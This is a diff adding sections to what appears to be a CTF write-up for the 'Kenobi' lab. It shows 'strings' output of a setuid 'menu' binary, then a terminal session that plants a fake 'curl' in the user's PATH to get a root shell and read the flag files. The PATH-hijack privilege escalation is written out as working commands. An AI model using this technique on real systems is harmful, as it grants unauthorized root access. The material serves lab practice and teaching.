@@ -730,5 +730,128 @@ $ find / -perm -u=s -type f 2>/dev/null
 /bin/ping6
 ```
 {% endtab %}
+
+{% tab title="strings" %}
+     strings /usr/bin/menu
+    /lib64/ld-linux-x86-64.so.2
+    libc.so.6
+    setuid
+    __isoc99_scanf
+    puts
+    __stack_chk_fail
+    printf
+    system
+    __libc_start_main
+    __gmon_start__
+    GLIBC_2.7
+    GLIBC_2.4
+    GLIBC_2.2.5
+    UH-`
+    AWAVA
+    AUATL
+    []A\A]A^A_
+    ***************************************
+    1. status check
+    2. kernel version
+    3. ifconfig
+    ** Enter your choice :
+    curl -I localhost
+    uname -r
+    ifconfig
+     Invalid choice
+    ;*3$"
+    GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+    crtstuff.c
+    __JCR_LIST__
+    deregister_tm_clones
+    __do_global_dtors_aux
+    completed.7594
+    __do_global_dtors_aux_fini_array_entry
+    frame_dummy
+    __frame_dummy_init_array_entry
+    menu.c
+    __FRAME_END__
+    __JCR_END__
+    __init_array_end
+    _DYNAMIC
+    __init_array_start
+    __GNU_EH_FRAME_HDR
+    _GLOBAL_OFFSET_TABLE_
+    __libc_csu_fini
+    _ITM_deregisterTMCloneTable
+    puts@@GLIBC_2.2.5
+    _edata
+    __stack_chk_fail@@GLIBC_2.4
+    system@@GLIBC_2.2.5
+    printf@@GLIBC_2.2.5
+    __libc_start_main@@GLIBC_2.2.5
+    __data_start
+    __gmon_start__
+    __dso_handle
+    _IO_stdin_used
+    __libc_csu_init
+    __bss_start
+    main
+    _Jv_RegisterClasses
+    __isoc99_scanf@@GLIBC_2.7
+    __TMC_END__
+    _ITM_registerTMCloneTable
+    setuid@@GLIBC_2.2.5
+    .symtab
+    .strtab
+    .shstrtab
+    .interp
+    .note.ABI-tag
+    .note.gnu.build-id
+    .gnu.hash
+    .dynsym
+    .dynstr
+    .gnu.version
+    .gnu.version_r
+    .rela.dyn
+    .rela.plt
+    .init
+    .plt.got
+    .text
+    .fini
+    .rodata
+    .eh_frame_hdr
+    .eh_frame
+    .init_array
+    .fini_array
+    .jcr
+    .dynamic
+    .got.plt
+    .data
+    .bss
+    .comment
+{% endtab %}
+
+{% tab title="Fake curl" %}
+```
+kenobi@kenobi:~$ echo $PATH
+/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:~$ rm bin/curl 
+kenobi@kenobi:~$ echo /bin/sh > bin/curl 
+kenobi@kenobi:~$ chmod 777 !$
+chmod 777 bin/curl
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# ls
+bin  curl  share  user.txt
+# cat user.txt
+d0b0f3f53b6caa532a83915e19224899
+# cat /root/root.txt
+177b3cd8562289f37382721c28381f02
+
+```
+{% endtab %}
 {% endtabs %}
 
